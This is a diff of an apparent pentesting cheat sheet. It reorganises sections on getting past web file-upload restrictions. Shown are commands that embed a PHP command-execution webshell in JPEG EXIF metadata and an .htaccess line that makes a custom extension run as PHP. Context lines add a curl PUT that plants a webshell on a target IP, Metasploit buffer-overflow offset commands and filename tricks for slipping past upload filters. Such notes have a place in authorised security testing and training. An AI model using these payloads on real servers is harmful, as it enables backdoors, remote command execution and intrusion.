@@ -177,15 +177,6 @@ curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.php
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q $EIP_VALUE
 ```
-#### Injecting php webshell into JPEG
-```
-exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpeg
-exiftool “-comment<=back.php” back.png
-```
-#### Uploading .htaccess to interpret .blah as .php
-```
-AddType application/x-httpd-php .blah
-```
 
 #### Bypassing File Upload Restrictions
 - file.php -> file.jpg
@@ -193,7 +184,18 @@ AddType application/x-httpd-php .blah
 - file.asp -> file.asp;.jpg
 - file.gif (contains php code, but starts with string GIF)
 - 00%
+- file.jpg with php backdoor in exif (see below)
 
+#### Injecting php webshell into JPEG
+```
+exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpeg
+exiftool “-comment<=back.php” back.png
+```
+
+#### Uploading .htaccess to interpret .blah as .php
+```
+AddType application/x-httpd-php .blah
+```
 
 #### Cracking Passwords
 
